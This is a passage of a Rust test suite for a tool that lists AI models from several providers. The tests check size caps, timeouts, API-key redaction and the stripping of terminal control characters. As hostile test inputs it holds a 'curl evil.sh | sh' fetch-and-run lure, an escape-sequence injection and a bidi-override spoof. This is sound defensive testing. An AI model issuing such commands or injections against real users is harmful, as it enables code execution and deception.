        assert!(
            format!("{err:#}").contains("cap"),
            "expected the cap error, got {err:#}"
        );
    }

    #[tokio::test]
    async fn a_hostile_body_cannot_reach_the_modal_through_the_parse_error() {
        // `serde_json::Error`'s Display embeds the offending value for an `invalid_type` error
        // (`invalid type: string "...", expected a sequence`). Carrying it would put up to
        // `max_body_bytes` of endpoint-chosen text into the modal, framed as this tool's own
        // error — reachable with no credential at all via the Ollama path on 127.0.0.1:11434.
        const MARKER: &str = "YOUR SESSION IS EXPIRED, RUN: curl evil.sh | sh";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(format!(r#"{{"data":"{MARKER}"}}"#))
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "test-key", tight())
            .await
            .expect_err("a `data` that is not a sequence must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains(MARKER),
            "no endpoint-chosen text may reach an error the modal renders: {chain}"
        );
        assert!(
            chain.contains("not valid JSON"),
            "the diagnostic must survive the redaction: {chain}"
        );
    }

    #[tokio::test]
    async fn a_body_at_the_cap_is_still_accepted() {
        // A literal body, so its exact byte length is knowable and the boundary is genuinely
        // pinned as `>` rather than `>=`.
        const BODY: &str = r#"{"data":[{"id":"gpt-4o"}]}"#;
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_string(BODY)
                    .insert_header("content-type", "application/json"),
            )
            .mount(&server)
            .await;

        let ids = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_body_bytes: BODY.len(),
                ..tight()
            },
        )
        .await
        .expect("a body of exactly max_body_bytes must be accepted");
        assert_eq!(ids, vec!["gpt-4o"]);
    }

    #[tokio::test]
    async fn an_over_long_model_list_is_refused() {
        let server = MockServer::start().await;
        let ids: Vec<_> = (0..20)
            .map(|i| serde_json::json!({ "id": format!("m{i:02}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_models: 5,
                ..tight()
            },
        )
        .await
        .expect_err(
            "an over-long list must be refused, not silently cut to an endpoint-chosen prefix",
        );

        let chain = format!("{err:#}");
        assert!(
            chain.contains("20") && chain.contains('5'),
            "the error must name both the count and the cap: {chain}"
        );
        assert!(
            !chain.contains("m0") && !chain.contains("m1"),
            "no model id may reach an error the modal renders: {chain}"
        );
    }

    #[tokio::test]
    async fn a_list_exactly_at_the_cap_is_accepted() {
        let server = MockServer::start().await;
        let ids: Vec<_> = (0..5)
            .map(|i| serde_json::json!({ "id": format!("m{i:02}") }))
            .collect();
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({ "data": ids })),
            )
            .mount(&server)
            .await;

        let ids = list_models_at(
            "openai",
            &server.uri(),
            "test-key",
            ListBounds {
                max_models: 5,
                ..tight()
            },
        )
        .await
        .expect("a list of exactly max_models ids must be accepted");
        assert_eq!(ids, vec!["m00", "m01", "m02", "m03", "m04"]);
    }

    #[tokio::test]
    async fn a_stalled_endpoint_fails_at_the_deadline() {
        // Every request site, not just `openai`. The deadline is now funnelled through
        // `model_list_request`, but this is what makes that structural claim checkable: deleting
        // `.timeout(...)` for any single provider must fail here. Ollama matters most — it needs
        // no credential, so anything on 127.0.0.1:11434 reaches it.
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_delay(Duration::from_secs(5)))
            .mount(&server)
            .await;

        let bounds = ListBounds {
            timeout: Duration::from_millis(150),
            ..tight()
        };

        // Identified structurally, never by message text, and with no assertion on elapsed
        // wall-clock time (which would be flaky under load).
        fn assert_timeout(label: &str, err: &anyhow::Error) {
            assert!(
                err.downcast_ref::<reqwest::Error>()
                    .is_some_and(reqwest::Error::is_timeout),
                "{label}: expected a reqwest timeout, got {err:#}"
            );
        }

        for provider in ["anthropic", "openai", "gemini", "deepseek"] {
            let err = list_models_at(provider, &server.uri(), "test-key", bounds)
                .await
                .unwrap_err();
            assert_timeout(provider, &err);
        }

        let err = list_ollama_models_at(&server.uri(), bounds)
            .await
            .unwrap_err();
        assert_timeout("ollama", &err);
    }

    #[test]
    fn default_bounds_are_the_production_values() {
        // Pinned so a later accidental widening is a failing test rather than a silent regression.
        assert_eq!(ListBounds::DEFAULT.timeout, Duration::from_secs(15));
        assert_eq!(ListBounds::DEFAULT.max_body_bytes, 2 * 1024 * 1024);
        assert_eq!(ListBounds::DEFAULT.max_error_bytes, 16 * 1024);
        assert_eq!(ListBounds::DEFAULT.max_models, 1_000);
    }

    #[tokio::test]
    async fn a_gemini_invalid_key_400_surfaces_the_providers_own_message() {
        // The motivating case for #59. Google answers an invalid API key with 400
        // INVALID_ARGUMENT, not 401/403, so the status line alone tells the user nothing about
        // their key — the body is the only place the diagnosis exists.
        const MESSAGE: &str = "API key not valid. Please pass a valid API key.";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1beta/models"))
            .respond_with(ResponseTemplate::new(400).set_body_json(serde_json::json!({
                "error": { "code": 400, "message": MESSAGE, "status": "INVALID_ARGUMENT" }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("gemini", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 400 must be an error");

        let chain = format!("{err:#}");
        assert!(
            chain.contains(MESSAGE),
            "the provider's own diagnostic must reach the error: {chain}"
        );
        assert!(
            chain.contains("400"),
            "the status must survive too: {chain}"
        );
    }

    #[tokio::test]
    async fn the_status_error_survives_in_the_chain_for_classification() {
        // The regression guard for the whole design. `crates/tui` recovers the HTTP status by
        // walking `anyhow::Error::chain()` for a `reqwest::Error` and calling `status()`; if the
        // non-2xx arm ever stopped putting that error in the chain, every 401/403 would silently
        // degrade to the retryable class and the credentials step would become unreachable. This
        // test mirrors that walk exactly, so the regression fails here instead of in the TUI.
        const MESSAGE: &str = "Incorrect API key provided";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": {
                    "message": MESSAGE,
                    "type": "invalid_request_error",
                    "code": "invalid_api_key"
                }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 401 must be an error");

        let status = err
            .chain()
            .find_map(|e| e.downcast_ref::<reqwest::Error>())
            .and_then(reqwest::Error::status)
            .map(|s| s.as_u16());
        assert_eq!(
            status,
            Some(401),
            "the status must stay recoverable from the chain: {err:#}"
        );
        assert!(
            format!("{err:#}").contains(MESSAGE),
            "the OpenAI-shaped envelope must be extracted: {err:#}"
        );
    }

    #[tokio::test]
    async fn an_anthropic_error_envelope_is_extracted_despite_its_outer_type_field() {
        // Anthropic wraps the same `error.message` in an envelope with a sibling `type` field.
        // Unknown top-level fields must be ignored rather than failing the parse into the raw-text
        // fallback.
        const MESSAGE: &str = "invalid x-api-key";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "type": "error",
                "error": { "type": "authentication_error", "message": MESSAGE }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("anthropic", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 401 must be an error");
        assert!(
            format!("{err:#}").contains(MESSAGE),
            "the Anthropic-shaped envelope must be extracted: {err:#}"
        );
    }

    #[tokio::test]
    async fn an_ollama_string_error_envelope_is_extracted() {
        // Ollama answers `{"error":"..."}` — a bare string where the others nest an object. It also
        // takes no credential, so this is the one capture path an unauthenticated local process can
        // drive.
        const MESSAGE: &str = "model not found";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/api/tags"))
            .respond_with(ResponseTemplate::new(404).set_body_json(serde_json::json!({
                "error": MESSAGE
            })))
            .mount(&server)
            .await;

        let err = list_ollama_models_at(&server.uri(), tight())
            .await
            .expect_err("a 404 must be an error");
        assert!(
            format!("{err:#}").contains(MESSAGE),
            "the Ollama-shaped envelope must be extracted: {err:#}"
        );
    }

    #[tokio::test]
    async fn a_non_json_error_body_is_flattened_to_one_bounded_line() {
        // Gateways and proxies answer with HTML or text/plain rather than an envelope, so the raw
        // text is the only signal there is. It is flattened rather than cut at the first line:
        // deleting the newline is what lets `redact_secret` still match a key the sender split
        // across one (see `a_key_split_by_a_newline_in_the_body_is_still_redacted`). The layout
        // guarantee is unchanged — the result is a single line either way — and the length is bound
        // by `DETAIL_MAX_CHARS` rather than by where the sender happened to put a newline.
        const SECOND_LINE: &str = "SECOND-LINE-IS-JOINED-ON";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(
                ResponseTemplate::new(502)
                    .set_body_string(format!("upstream connect error\n{SECOND_LINE}")),
            )
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "test-key", tight())
            .await
            .expect_err("a 502 must be an error");

        let chain = format!("{err:#}");
        assert!(
            chain.contains("upstream connect error"),
            "a non-JSON body's text must survive: {chain}"
        );
        assert!(
            chain.contains(SECOND_LINE),
            "later lines are joined on, not dropped — the newline is deleted: {chain}"
        );
        assert!(
            !chain.chars().any(char::is_control),
            "the detail must still be a single control-free line: {chain:?}"
        );
    }

    #[tokio::test]
    async fn an_empty_error_body_yields_a_status_only_message() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(chain.contains("401"), "the status must be named: {chain}");
        assert!(
            chain.contains("no error detail"),
            "the absence of a body must be stated, not implied: {chain}"
        );
    }

    #[tokio::test]
    async fn an_oversized_error_body_is_refused_rather_than_captured() {
        // What this pins: that the error read is governed by `max_error_bytes` rather than by the
        // far larger `max_body_bytes`, and that refusing degrades to the status line with no body
        // content leaking. It deliberately does NOT re-pin `read_capped`'s cumulative running-total
        // bound — a body this small arrives in a single frame, so the check trips on iteration one.
        // That property is pinned on the same function by
        // `an_oversized_body_is_refused_instead_of_buffered`, which sizes its body above hyper's
        // largest read frame precisely to bind it; duplicating a multi-megabyte body here would buy
        // nothing.
        //
        // The error path matters more than the success path, not less: it is reached *without* a
        // valid credential.
        const MARKER: &str = "RUN-THIS-COMMAND";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": { "message": format!("{MARKER}{}", "x".repeat(4096)) }
            })))
            .mount(&server)
            .await;

        let err = list_models_at(
            "openai",
            &server.uri(),
            "bad-key",
            ListBounds {
                max_error_bytes: 64,
                ..tight()
            },
        )
        .await
        .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains(MARKER),
            "no over-cap body content may reach the error: {chain}"
        );
        assert!(chain.contains("401"), "the status must survive: {chain}");
    }

    #[tokio::test]
    async fn an_error_body_echoing_the_api_key_is_redacted() {
        // A misconfigured gateway — or an attacker-chosen `*_BASE_URL` override — can echo the
        // submitted key back in its error body. Rendering that into a terminal cell would put the
        // user's live credential into their scrollback.
        //
        // The padding is load-bearing, not decoration. It pushes the key across the
        // `DETAIL_MAX_CHARS` boundary so this test pins the *order* of the transforms, not just
        // that redaction happens at all: redact-then-cap yields a detail with no key in it, while
        // cap-then-redact would keep the first ~37 characters of the key — a usable prefix — and
        // `!chain.contains("0123456789abcdef")` is what catches that.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": {
                    "message": format!("{} The API key {KEY} is not authorized", "x".repeat(150))
                }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), KEY, tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains(KEY),
            "the key must not reach the error: {chain}"
        );
        assert!(
            !chain.contains("0123456789abcdef"),
            "not even a prefix of the key may survive: {chain}"
        );
        assert!(
            chain.contains("<redacted>"),
            "the redaction must be visible rather than silent: {chain}"
        );
    }

    #[tokio::test]
    async fn control_characters_are_stripped_from_the_error_detail() {
        // A raw ESC written into a terminal cell is an escape-sequence injection; the body is
        // remote-controlled, so it can carry one. Newlines go the same way, which is what keeps the
        // detail to one line without a structural cut that redaction cannot see through.
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(403).set_body_json(serde_json::json!({
                "error": { "message": "denied\u{1b}]0;pwned\u{7}\nsecond line" }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 403 must be an error");

        let chain = format!("{err:#}");
        assert!(
            chain.contains("denied"),
            "the diagnostic must survive: {chain}"
        );
        assert!(
            !chain.chars().any(char::is_control),
            "no control character may reach a rendered line: {chain:?}"
        );
        assert!(
            chain.contains("second line"),
            "the newline is deleted rather than cut at, so the tail joins on: {chain}"
        );
    }

    #[tokio::test]
    async fn an_over_long_error_detail_is_capped() {
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(400).set_body_json(serde_json::json!({
                "error": { "message": "z".repeat(1_000) }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 400 must be an error");

        let chain = format!("{err:#}");
        // `==`, not `<=`: `cap_chars` keeps exactly `max` characters when it truncates, so an
        // upper bound would still pass if the cap silently tightened.
        assert_eq!(
            chain.matches('z').count(),
            DETAIL_MAX_CHARS,
            "the detail must be capped at exactly {DETAIL_MAX_CHARS} characters: {chain}"
        );
        assert!(
            chain.contains('\u{2026}'),
            "a truncated detail must say so: {chain}"
        );
    }

    #[tokio::test]
    async fn a_key_split_by_a_newline_in_the_body_is_still_redacted() {
        // The exact-substring redaction can only match a key that is contiguous in the text it runs
        // against. Every transform that *deletes* characters can therefore reassemble a split key
        // and must run before redaction — a newline included, which is why the detail is flattened
        // rather than cut at the first line.
        //
        // Without the flattening this leaks: `.lines().next()` cuts the key at the newline, the
        // surviving fragment no longer matches the key, and redaction silently does nothing. The
        // split point is attacker-chosen, so the leaked fragment can be nearly the whole key.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let (head, tail) = KEY.split_at(32);
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": { "message": format!("invalid key {head}\n{tail} was rejected") }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), KEY, tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains(head),
            "a newline inside the key must not let a 32-character prefix escape redaction: {chain}"
        );
        assert!(
            !chain.contains("0123456789abcdef"),
            "not even a prefix of the key may survive: {chain}"
        );
    }

    #[tokio::test]
    async fn a_key_split_by_an_invalid_utf8_byte_is_still_redacted() {
        // The sharpest evasion: the splitting character is inserted by *our own* decoder.
        // `String::from_utf8_lossy` turns a single sender-chosen invalid byte into U+FFFD, which is
        // not a control character — so before `is_invisible` covered it, the whole 40-character key
        // was rendered in the clear, split only by a glyph a reader skims past.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let mut body: Vec<u8> = Vec::new();
        body.extend_from_slice(br#"{"error":{"message":"invalid key "#);
        body.extend_from_slice(&KEY.as_bytes()[..20]);
        body.push(0xFF);
        body.extend_from_slice(&KEY.as_bytes()[20..]);
        body.extend_from_slice(br#" was rejected"}}"#);

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_bytes(body))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), KEY, tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains("0123456789abcdef"),
            "an invalid byte inside the key must not defeat redaction: {chain}"
        );
        assert!(
            chain.contains("<redacted>"),
            "the key must be redacted, not merely absent: {chain}"
        );
    }

    #[tokio::test]
    async fn a_key_split_by_a_zero_width_space_is_still_redacted() {
        // U+200B is category Cf, not Cc, so `char::is_control` returns false for it. Without
        // `is_invisible` it would survive normalization, split the key, and render a credential
        // that looks entirely intact on screen.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let (head, tail) = KEY.split_at(24);
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": { "message": format!("invalid key {head}\u{200b}{tail} was rejected") }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), KEY, tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains("0123456789abcdef"),
            "a zero-width space inside the key must not defeat redaction: {chain}"
        );
        assert!(
            chain.contains("<redacted>"),
            "the key must be redacted, not merely absent: {chain}"
        );
    }

    #[tokio::test]
    async fn a_key_stored_with_surrounding_spaces_is_still_redacted() {
        // `resolve_key` (crates/tui/src/selection.rs) filters only for emptiness and never trims,
        // so a key pasted or read from a file can carry surrounding spaces. Spaces are legal in an
        // HTTP header value, so unlike a stray newline this reaches the wire, the endpoint echoes
        // the *trimmed* key it actually parsed, and redaction must still fire. It only does because
        // `redact_secret` normalizes the needle the same way the haystack was normalized.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let stored = format!("  {KEY}  ");
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(401).set_body_json(serde_json::json!({
                "error": { "message": format!("The API key {KEY} is not authorized") }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), &stored, tight())
            .await
            .expect_err("a 401 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains("0123456789abcdef"),
            "a stored key's surrounding spaces must not defeat redaction: {chain}"
        );
        assert!(
            chain.contains("<redacted>"),
            "the key must be redacted, not merely absent: {chain}"
        );
    }

    #[test]
    fn redaction_normalizes_the_needle_the_same_way_as_the_haystack() {
        // The unit-level contract behind the test above, pinned without the HTTP layer — reqwest
        // refuses to build a header from a value containing a newline, so the control-character
        // half of this can only be reached directly.
        const KEY: &str = "sk-test-0123456789abcdef0123456789abcdef";
        let rendered = normalize_detail(&format!("The API key {KEY} is not authorized"));
        for stored in [
            format!("{KEY}\n"),       // export KEY=$(cat key.txt)
            format!("  {KEY}  "),     // pasted with surrounding spaces
            format!("{KEY}\u{200b}"), // a zero-width space rode along on the paste
        ] {
            let out = redact_secret(rendered.clone(), Some(&stored));
            assert!(
                !out.contains("0123456789abcdef"),
                "a key stored as {stored:?} must still redact, got {out:?}"
            );
        }
    }

    #[tokio::test]
    async fn bidi_override_characters_are_stripped_from_the_error_detail() {
        // A RIGHT-TO-LEFT OVERRIDE can visually reorder a rendered line, which is the same class of
        // terminal attack as a raw ESC. `char::is_control` does not catch it.
        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/models"))
            .respond_with(ResponseTemplate::new(403).set_body_json(serde_json::json!({
                "error": { "message": "denied\u{202e}drowssap ruoy retne\u{202c}" }
            })))
            .mount(&server)
            .await;

        let err = list_models_at("openai", &server.uri(), "bad-key", tight())
            .await
            .expect_err("a 403 must be an error");

        let chain = format!("{err:#}");
        assert!(
            !chain.contains('\u{202e}') && !chain.contains('\u{202c}'),
            "no bidi override may reach a rendered line: {chain:?}"
        );
        assert!(
            chain.contains("denied"),
            "the diagnostic itself must survive: {chain}"
        );
    }

    #[test]
    fn a_whitespace_only_key_redacts_nothing_rather_than_everything() {
        // A needle that normalizes to nothing must be skipped: `str::replace` with an empty pattern
        // matches at every character boundary and would turn the whole detail into markers.
        let text = "the endpoint said no".to_string();
        assert_eq!(redact_secret(text.clone(), Some("   \n")), text);
        assert_eq!(redact_secret(text.clone(), Some("")), text);
        assert_eq!(redact_secret(text.clone(), None), text);
    }
}
